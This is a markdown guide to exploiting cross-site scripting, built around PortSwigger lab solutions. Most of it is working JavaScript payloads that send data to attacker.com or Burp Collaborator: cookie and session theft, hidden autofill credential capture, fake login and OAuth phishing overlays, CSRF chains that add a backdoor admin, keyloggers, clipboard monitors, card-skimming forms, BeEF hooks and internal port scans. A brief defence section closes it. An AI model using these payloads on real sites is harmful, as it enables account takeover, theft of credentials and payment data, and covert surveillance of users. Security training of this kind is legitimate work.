# XSS Exploitation Techniques - Complete Guide

## Overview

This guide provides comprehensive exploitation techniques for Cross-Site Scripting (XSS) vulnerabilities, based on PortSwigger Web Security Academy labs and real-world scenarios.

---

## Table of Contents

1. [Cookie Theft](#cookie-theft)
2. [Password Capture](#password-capture)
3. [CSRF via XSS](#csrf-via-xss)
4. [Keylogging](#keylogging)
5. [Website Defacement](#website-defacement)
6. [BeEF Framework Integration](#beef-framework-integration)
7. [Internal Network Scanning](#internal-network-scanning)
8. [Session Hijacking](#session-hijacking)
9. [Data Exfiltration](#data-exfiltration)
10. [Phishing Attacks](#phishing-attacks)

---

## Cookie Theft

### Objective
Steal session cookies to impersonate users and gain unauthorized access to their accounts.

### PortSwigger Lab: Exploiting XSS to Steal Cookies

**Lab URL**: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies

**Difficulty**: Practitioner

**Description**: This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

**Solution Steps**:

1. **Access Burp Collaborator**:
   - Open Burp Suite
   - Navigate to Burp Collaborator client
   - Click "Copy to clipboard" to get unique subdomain

2. **Craft Cookie Theft Payload**:
   ```javascript
   <script>
   fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
       method: 'POST',
       mode: 'no-cors',
       body: document.cookie
   });
   </script>
   ```

3. **Inject Payload**:
   - Navigate to any blog post
   - Post a comment with the malicious script
   - Fill in required fields (name, email, website)
   - Submit the comment

4. **Monitor Burp Collaborator**:
   - Return to Burp Collaborator client
   - Click "Poll now"
   - Wait for HTTP interactions
   - Locate POST request body containing victim's cookie

5. **Use Stolen Cookie**:
   - Open Burp Proxy → HTTP history
   - Find request to /my-account
   - Send to Repeater
   - Replace your session cookie with victim's cookie
   - Send request
   - Access victim's account

**Alternative Payloads**:

**Using Image Beacon**:
```javascript
<script>
new Image().src='https://BURP-COLLABORATOR-SUBDOMAIN?c='+encodeURIComponent(document.cookie);
</script>
```

**Using XMLHttpRequest**:
```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://BURP-COLLABORATOR-SUBDOMAIN?cookie='+document.cookie, true);
xhr.send();
</script>
```

**Using Location Redirect**:
```javascript
<script>
document.location='https://BURP-COLLABORATOR-SUBDOMAIN?c='+document.cookie;
</script>
```

### HTTP Request to Exfiltrate:
```http
POST /UNIQUE-ID HTTP/1.1
Host: BURP-COLLABORATOR-SUBDOMAIN
User-Agent: Mozilla/5.0...
Content-Type: text/plain
Content-Length: 32

secret=ABC123; session=XYZ456
```

### Cookie Protection Bypass

**HttpOnly Flag**:
- Cookies with HttpOnly cannot be accessed by JavaScript
- `document.cookie` returns empty for HttpOnly cookies
- **Bypass**: Instead of stealing cookie, make authenticated requests on victim's behalf

```javascript
<script>
// Can't steal HttpOnly cookie, but can perform actions as victim
fetch('/api/sensitive-data')
    .then(r => r.text())
    .then(data => {
        // Exfiltrate response data instead
        fetch('https://attacker.com/exfil', {
            method: 'POST',
            body: data
        });
    });
</script>
```

**SameSite Attribute**:
- `SameSite=Strict`: Never sent with cross-site requests
- `SameSite=Lax`: Sent only with top-level navigation
- `SameSite=None`: Sent with cross-site requests (requires Secure)
- **Impact**: XSS on same domain bypasses SameSite protection

### Real-World Considerations

**Cookie Expiration**:
- Session cookies may expire quickly
- Use stolen cookie immediately
- Implement keep-alive mechanism if possible

**IP-Based Validation**:
- Some applications validate session by IP address
- May need to proxy through victim's IP
- Less common in modern applications

**Multi-Factor Authentication**:
- MFA may prevent account takeover even with valid cookie
- Focus on actions that don't trigger MFA
- Steal MFA tokens if possible

### Common Mistakes

1. **Not URL-encoding the cookie value**
2. **Using GET with long cookies (URL length limits)**
3. **Forgetting to use no-cors mode**
4. **Not checking Collaborator frequently enough**
5. **Testing with your own cookie (HttpOnly may apply)**

---

## Password Capture

### Objective
Capture user credentials through autofill exploitation or fake login forms.

### PortSwigger Lab: Exploiting XSS to Capture Passwords

**Lab URL**: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords

**Difficulty**: Practitioner

**Description**: This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

**Solution Steps**:

1. **Access Burp Collaborator**:
   - Get your unique Collaborator subdomain

2. **Craft Password Capture Payload**:
   ```html
   <input name=username id=username>
   <input type=password name=password onchange="
   if(this.value.length)
       fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
           method:'POST',
           mode: 'no-cors',
           body:username.value+':'+this.value
       });
   ">
   ```

3. **Post Comment**:
   - Navigate to blog post
   - Inject payload in comment field
   - Submit comment

4. **Monitor Collaborator**:
   - Poll Burp Collaborator
   - Check POST request body for credentials
   - Format: `username:password`

5. **Login with Stolen Credentials**:
   - Use captured username and password
   - Access victim's account

**How Autofill Exploitation Works**:

1. **Browser Detection**:
   - Browser's password manager scans for input fields
   - Detects `type="password"` and nearby username field
   - Automatically fills in saved credentials

2. **Event Trigger**:
   - `onchange` event fires when field value changes
   - Autofill triggers change event
   - Credentials immediately exfiltrated

3. **Stealth**:
   - Inputs can be hidden with CSS
   - User may not notice fields
   - Execution happens in background

**Hidden Input Technique**:
```html
<style>
.stealth { position: absolute; left: -9999px; }
</style>
<input name=username class=stealth>
<input type=password name=password class=stealth onchange="
    if(this.value.length) {
        fetch('https://attacker.com/creds', {
            method: 'POST',
            mode: 'no-cors',
            body: username.value + ':' + this.value
        });
    }
">
```

### Fake Login Form Technique

**Complete Page Overlay**:
```html
<style>
body { display: none; }
#fake-login {
    display: block;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: white;
    z-index: 9999;
    text-align: center;
    padding-top: 100px;
}
</style>
<div id="fake-login">
    <h2>Session Expired</h2>
    <p>Please login again to continue</p>
    <form id="phish">
        <input type="text" name="username" placeholder="Username" required><br><br>
        <input type="password" name="password" placeholder="Password" required><br><br>
        <input type="submit" value="Login">
    </form>
</div>
<script>
document.getElementById('phish').onsubmit = function(e) {
    e.preventDefault();
    var user = document.querySelector('[name=username]').value;
    var pass = document.querySelector('[name=password]').value;

    // Send to attacker
    fetch('https://attacker.com/steal', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({username: user, password: pass})
    });

    // Actually log them in (less suspicious)
    fetch('/login', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({username: user, password: pass})
    }).then(() => location.reload());
};
</script>
```

### Enhanced Techniques

**Credential Validation Before Exfiltration**:
```javascript
document.getElementById('phish').onsubmit = function(e) {
    e.preventDefault();
    var user = document.querySelector('[name=username]').value;
    var pass = document.querySelector('[name=password]').value;

    // Validate credentials first
    fetch('/login', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({username: user, password: pass})
    }).then(response => {
        if (response.ok) {
            // Only exfiltrate valid credentials
            fetch('https://attacker.com/steal', {
                method: 'POST',
                mode: 'no-cors',
                body: user + ':' + pass
            });
            location.reload();
        } else {
            alert('Invalid credentials. Please try again.');
        }
    });
};
```

### Common Mistakes

1. **Not hiding input fields**
2. **Missing onchange handler**
3. **Not testing autofill behavior**
4. **Forgetting to check Collaborator**
5. **Using GET instead of POST for exfiltration**

---

## CSRF via XSS

### Objective
Bypass CSRF protections by stealing tokens and performing unauthorized state-changing actions.

### PortSwigger Lab: Exploiting XSS to Perform CSRF

**Lab URL**: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf

**Difficulty**: Practitioner

**Description**: This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments.

**Solution Steps**:

1. **Analyze Change Email Function**:
   - Log in with credentials: `wiener:peter`
   - Navigate to account page
   - Examine email change form
   - Identify CSRF token location
   - Note POST endpoint: `/my-account/change-email`

2. **Craft CSRF Token Extraction + Action Payload**:
   ```javascript
   <script>
   var req = new XMLHttpRequest();
   req.onload = handleResponse;
   req.open('get','/my-account',true);
   req.send();

   function handleResponse() {
       var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
       var changeReq = new XMLHttpRequest();
       changeReq.open('post', '/my-account/change-email', true);
       changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
       changeReq.send('csrf='+token+'&email=hacker@evil.com');
   };
   </script>
   ```

3. **Post Comment**:
   - Navigate to any blog post
   - Post comment with payload
   - Victim views comment
   - Email automatically changed

**HTTP Flow**:

1. **Fetch Page with Token**:
```http
GET /my-account HTTP/1.1
Host: target.com
Cookie: session=victim-session
```

2. **Response Contains Token**:
```html
<form method="POST" action="/my-account/change-email">
    <input name="csrf" value="AbCdEf123456">
    <input name="email" value="victim@email.com">
</form>
```

3. **Extract Token with Regex**:
```javascript
var token = responseText.match(/name="csrf" value="(\w+)"/)[1];
// token = "AbCdEf123456"
```

4. **Submit Change Request**:
```http
POST /my-account/change-email HTTP/1.1
Host: target.com
Cookie: session=victim-session
Content-Type: application/x-www-form-urlencoded

csrf=AbCdEf123456&email=hacker@evil.com
```

### Why CSRF Tokens Don't Stop XSS

**CSRF Protection Model**:
```
Cross-Origin Request → No token access → Request blocked
```

**XSS Advantage**:
```
Same-Origin XSS → Full DOM access → Token extracted → Request succeeds
```

**Key Principle**: CSRF tokens protect against cross-origin attacks, but XSS executes in same-origin context and bypasses Same-Origin Policy restrictions.

### Advanced CSRF via XSS

**Multiple Actions Chain**:
```javascript
<script>
// Step 1: Fetch CSRF token
fetch('/account')
    .then(r => r.text())
    .then(html => {
        var token = html.match(/csrf=([^"]+)/)[1];

        // Step 2: Change email
        return fetch('/account/change-email', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'csrf='+token+'&email=attacker@evil.com'
        });
    })
    .then(() => {
        // Step 3: Fetch new token
        return fetch('/account');
    })
    .then(r => r.text())
    .then(html => {
        var token = html.match(/csrf=([^"]+)/)[1];

        // Step 4: Add attacker as admin
        return fetch('/admin/add-user', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                csrf: token,
                username: 'backdoor',
                role: 'admin'
            })
        });
    })
    .then(() => {
        // Step 5: Exfiltrate confirmation
        fetch('https://attacker.com/success', {
            method: 'POST',
            body: 'Exploitation complete'
        });
    });
</script>
```

**Form Auto-Submit**:
```javascript
<script>
// Fetch token
var xhr = new XMLHttpRequest();
xhr.onload = function() {
    var token = this.responseText.match(/name="csrf" value="([^"]+)"/)[1];

    // Create form
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = '/my-account/change-email';

    // Add CSRF token
    var csrfInput = document.createElement('input');
    csrfInput.name = 'csrf';
    csrfInput.value = token;
    form.appendChild(csrfInput);

    // Add email
    var emailInput = document.createElement('input');
    emailInput.name = 'email';
    emailInput.value = 'attacker@evil.com';
    form.appendChild(emailInput);

    // Submit
    document.body.appendChild(form);
    form.submit();
};
xhr.open('GET', '/my-account', true);
xhr.send();
</script>
```

### Common Mistakes

1. **Incorrect regex for token extraction**
2. **Wrong Content-Type header**
3. **Not URL-encoding form data**
4. **Hardcoding token instead of extracting dynamically**
5. **Using duplicate email address**

---

## Keylogging

### Objective
Capture all keyboard input from the victim's browser.

### Basic Keylogger

**Simple Implementation**:
```javascript
<script>
var keys = '';
document.onkeypress = function(e) {
    keys += e.key;

    // Send every 50 characters to avoid data loss
    if(keys.length > 50) {
        fetch('https://attacker.com/keylog', {
            method: 'POST',
            mode: 'no-cors',
            body: keys
        });
        keys = '';
    }
};

// Send remaining keys on page unload
window.onbeforeunload = function() {
    if(keys.length > 0) {
        navigator.sendBeacon('https://attacker.com/keylog', keys);
    }
};
</script>
```

### Enhanced Keylogger with Context

**Comprehensive Logging**:
```javascript
<script>
var log = [];

// Capture all key events
document.addEventListener('keydown', function(e) {
    log.push({
        key: e.key,
        code: e.code,
        time: Date.now(),
        url: location.href,
        element: e.target.tagName,
        elementId: e.target.id,
        elementName: e.target.name,
        shift: e.shiftKey,
        ctrl: e.ctrlKey,
        alt: e.altKey,
        meta: e.metaKey
    });

    // Batch send every 20 keys
    if(log.length > 20) {
        sendLog();
    }
});

function sendLog() {
    if(log.length > 0) {
        navigator.sendBeacon('https://attacker.com/keylog', JSON.stringify(log));
        log = [];
    }
}

// Send on focus loss
window.addEventListener('blur', sendLog);

// Send on page unload
window.addEventListener('beforeunload', sendLog);

// Periodic backup send every 30 seconds
setInterval(sendLog, 30000);
</script>
```

### Password Field Detection

**Targeted Password Capture**:
```javascript
<script>
document.addEventListener('input', function(e) {
    // Detect password fields
    if(e.target.type === 'password' ||
       e.target.name.toLowerCase().includes('pass') ||
       e.target.id.toLowerCase().includes('pass')) {

        // Find associated username field
        var form = e.target.form;
        var username = '';

        if(form) {
            var userFields = form.querySelectorAll('[name*="user"], [name*="email"], [type="email"]');
            if(userFields.length > 0) {
                username = userFields[0].value;
            }
        }

        // Exfiltrate credentials
        fetch('https://attacker.com/creds', {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify({
                username: username,
                password: e.target.value,
                url: location.href,
                time: new Date().toISOString()
            })
        });
    }
});
</script>
```

### Clipboard Monitoring

**Capture Copy/Paste Actions**:
```javascript
<script>
// Monitor clipboard copy
document.addEventListener('copy', function(e) {
    var selection = window.getSelection().toString();
    fetch('https://attacker.com/clipboard', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({
            action: 'copy',
            content: selection,
            url: location.href
        })
    });
});

// Monitor clipboard paste
document.addEventListener('paste', function(e) {
    var pasted = (e.clipboardData || window.clipboardData).getData('text');
    fetch('https://attacker.com/clipboard', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({
            action: 'paste',
            content: pasted,
            url: location.href
        })
    });
});
</script>
```

### Common Use Cases

1. **Credential Harvesting**: Capture login attempts
2. **Sensitive Data**: Monitor input of credit cards, SSNs
3. **Session Persistence**: Long-term monitoring
4. **Two-Factor Codes**: Capture OTP/2FA tokens
5. **Private Messages**: Monitor chat/email composition

---

## Website Defacement

### Objective
Modify page appearance or inject malicious content.

### Complete Page Replacement

```javascript
<script>
// Full page defacement
document.body.innerHTML = `
    <div style="text-align:center; padding-top:100px; font-size:48px; color:red;">
        <h1>Site Compromised</h1>
        <p>This site has been hacked by [Attacker Name]</p>
        <p>All your data belongs to us!</p>
    </div>
`;
</script>
```

### Subtle Content Manipulation

**Link Hijacking**:
```javascript
<script>
// Replace all links with malicious URLs
document.querySelectorAll('a').forEach(function(link) {
    link.href = 'https://attacker.com/malware.exe';
});
</script>
```

**Payment Form Replacement**:
```javascript
<script>
if(location.pathname.includes('checkout')) {
    // Replace payment form
    var paymentForm = document.querySelector('.payment-form');
    if(paymentForm) {
        paymentForm.innerHTML = `
            <form action="https://attacker.com/steal-cc" method="POST">
                <input name="cardnumber" placeholder="Card Number" required>
                <input name="expiry" placeholder="MM/YY" required>
                <input name="cvv" placeholder="CVV" required>
                <button>Process Payment</button>
            </form>
        `;
    }
}
</script>
```

### Ad Injection

```javascript
<script>
// Inject malicious ads
var ad = document.createElement('div');
ad.innerHTML = '<iframe src="https://malicious-ads.com/serve" width="100%" height="250"></iframe>';
ad.style.cssText = 'position:fixed; bottom:0; left:0; width:100%; z-index:10000;';
document.body.appendChild(ad);
</script>
```

---

## BeEF Framework Integration

### BeEF (Browser Exploitation Framework)

**Purpose**: Gain complete control over victim's browser for advanced exploitation.

### Basic Hook Injection

```javascript
<script src="http://BEEF-SERVER:3000/hook.js"></script>
```

### Stealth Hook

```javascript
<script>
// Load BeEF dynamically to avoid detection
var s = document.createElement('script');
s.src = 'http://BEEF-SERVER:3000/hook.js';
document.head.appendChild(s);
</script>
```

### BeEF Capabilities

Once hooked, attacker can:

1. **Browser Information**:
   - OS and browser details
   - Installed plugins
   - Screen resolution
   - Network information

2. **Command Execution**:
   - Execute arbitrary JavaScript
   - Inject additional payloads
   - Module-based attacks

3. **Social Engineering**:
   - Fake notification bars
   - Fake update prompts
   - Clipboard hijacking

4. **Network Attacks**:
   - Port scanning
   - Service fingerprinting
   - Internal network mapping

5. **Data Theft**:
   - Cookie/session theft
   - Form data capture
   - Screenshot capture
   - Webcam/microphone access (with permissions)

### Example BeEF Commands

**Browser Information**:
- Get Browser Details
- Get Cookie
- Get Local Storage
- Get System Info

**Social Engineering**:
- Simple Hijacker
- Clippy
- Fake Flash Update
- Pretty Theft

**Network Discovery**:
- Ping Sweep
- Port Scanner
- Fingerprint Network

**Persistence**:
- Create Pop Under
- Create Iframe
- Man-In-The-Browser

---

## Internal Network Scanning

### Objective
Leverage victim's browser to scan internal networks not accessible from outside.

### Port Scanner

```javascript
<script>
var internal = '192.168.1.';
var ports = [21, 22, 23, 25, 80, 443, 3306, 3389, 5900, 8080, 8443];
var results = [];

for(var i = 1; i < 255; i++) {
    for(var j = 0; j < ports.length; j++) {
        (function(ip, port) {
            var start = Date.now();
            var img = new Image();

            img.onerror = function() {
                var elapsed = Date.now() - start;
                if(elapsed < 1000) {
                    // Quick failure = port closed or filtered
                    results.push({ip: ip, port: port, status: 'closed'});
                } else {
                    // Slow failure = port open but not HTTP
                    results.push({ip: ip, port: port, status: 'open'});
                }
            };

            img.onload = function() {
                // Image loaded = HTTP service running
                results.push({ip: ip, port: port, status: 'http'});
            };

            img.src = 'http://' + ip + ':' + port + '/?' + Math.random();

            // Send results batch
            if(results.length > 10) {
                sendResults();
            }
        })(internal + i, ports[j]);
    }
}

function sendResults() {
    if(results.length > 0) {
        fetch('https://attacker.com/scan-results', {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify(results)
        });
        results = [];
    }
}
</script>
```

### Service Fingerprinting

```javascript
<script>
// Identify services on discovered hosts
function fingerprint(ip, port) {
    fetch('http://' + ip + ':' + port)
        .then(r => r.text())
        .then(html => {
            var service = 'unknown';

            // Fingerprint based on response
            if(html.includes('Router')) service = 'router';
            if(html.includes('Apache')) service = 'apache';
            if(html.includes('nginx')) service = 'nginx';
            if(html.includes('Login')) service = 'web-admin';

            // Exfiltrate findings
            fetch('https://attacker.com/fingerprint', {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    ip: ip,
                    port: port,
                    service: service,
                    html: html.substring(0, 500)
                })
            });
        })
        .catch(e => {
            // Service exists but CORS blocks reading
            fetch('https://attacker.com/fingerprint', {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    ip: ip,
                    port: port,
                    service: 'cors-blocked'
                })
            });
        });
}

// Scan common internal IPs
['192.168.1.1', '192.168.0.1', '10.0.0.1'].forEach(ip => {
    fingerprint(ip, 80);
    fingerprint(ip, 443);
    fingerprint(ip, 8080);
});
</script>
```

---

## Session Hijacking

### Objective
Take over user's active session completely.

### Complete Session Takeover

```javascript
<script>
// Gather all session data
var sessionData = {
    cookies: document.cookie,
    localStorage: {},
    sessionStorage: {},
    location: location.href,
    referrer: document.referrer,
    userAgent: navigator.userAgent,
    timestamp: new Date().toISOString()
};

// Extract all storage
for(var key in localStorage) {
    if(localStorage.hasOwnProperty(key)) {
        sessionData.localStorage[key] = localStorage[key];
    }
}

for(var key in sessionStorage) {
    if(sessionStorage.hasOwnProperty(key)) {
        sessionData.sessionStorage[key] = sessionStorage[key];
    }
}

// Exfiltrate everything
fetch('https://attacker.com/hijack', {
    method: 'POST',
    mode: 'no-cors',
    body: JSON.stringify(sessionData)
});
</script>
```

---

## Data Exfiltration

### Objective
Extract sensitive data from the application.

### Comprehensive Data Extraction

```javascript
<script>
// Extract all sensitive data from page
var data = {
    // Page content
    html: document.documentElement.outerHTML,

    // All forms and their data
    forms: [],

    // All visible text
    bodyText: document.body.innerText,

    // API tokens in scripts
    scripts: [],

    // Meta information
    meta: {}
};

// Extract form data
document.querySelectorAll('form').forEach(form => {
    var formData = {
        action: form.action,
        method: form.method,
        fields: []
    };

    form.querySelectorAll('input, textarea, select').forEach(field => {
        formData.fields.push({
            name: field.name,
            type: field.type,
            value: field.value
        });
    });

    data.forms.push(formData);
});

// Extract script sources
document.querySelectorAll('script').forEach(script => {
    if(script.src) {
        data.scripts.push(script.src);
    }
});

// Extract meta tags
document.querySelectorAll('meta').forEach(meta => {
    var name = meta.getAttribute('name') || meta.getAttribute('property');
    var content = meta.getAttribute('content');
    if(name && content) {
        data.meta[name] = content;
    }
});

// Exfiltrate
fetch('https://attacker.com/exfil', {
    method: 'POST',
    mode: 'no-cors',
    body: JSON.stringify(data)
});
</script>
```

---

## Phishing Attacks

### OAuth Phishing

```javascript
<script>
// Inject fake OAuth prompt
var overlay = document.createElement('div');
overlay.innerHTML = `
    <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:99999; display:flex; align-items:center; justify-content:center;">
        <div style="background:white; padding:40px; border-radius:10px; max-width:400px;">
            <img src="https://target-site.com/logo.png" style="width:100px;">
            <h2>Continue with Google</h2>
            <p>This application needs access to your Google account</p>
            <form id="oauth-phish">
                <input type="email" placeholder="Email" required style="width:100%; padding:10px; margin:10px 0;">
                <input type="password" placeholder="Password" required style="width:100%; padding:10px; margin:10px 0;">
                <button style="width:100%; padding:10px; background:#4285f4; color:white; border:none; border-radius:5px;">Sign in</button>
            </form>
        </div>
    </div>
`;
document.body.appendChild(overlay);

document.getElementById('oauth-phish').onsubmit = function(e) {
    e.preventDefault();
    var email = this.querySelector('[type=email]').value;
    var pass = this.querySelector('[type=password]').value;

    fetch('https://attacker.com/phish', {
        method: 'POST',
        mode: 'no-cors',
        body: email + ':' + pass
    });

    overlay.remove();
};
</script>
```

---

## Defense Against Exploitation

### Input Validation
- Whitelist allowed characters
- Validate data type and format
- Reject dangerous patterns

### Output Encoding
- HTML entity encoding for HTML context
- JavaScript encoding for JavaScript context
- URL encoding for URL parameters
- Context-aware encoding always

### Content Security Policy
```http
Content-Security-Policy:
    default-src 'none';
    script-src 'self' 'nonce-RANDOM';
    style-src 'self';
    object-src 'none';
    base-uri 'self';
    form-action 'self';
```

### Cookie Security
```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

### HTTP Security Headers
```http
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
```

---

## References

1. **PortSwigger XSS Labs**: https://portswigger.net/web-security/all-labs#cross-site-scripting
2. **OWASP XSS Guide**: https://owasp.org/www-community/attacks/xss/
3. **BeEF Project**: https://github.com/beefproject/beef
4. **XSS Hunter**: https://xsshunter.com/
5. **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

---

**Document Version**: 1.0
**Last Updated**: January 9, 2026
**Source**: PortSwigger Web Security Academy Labs
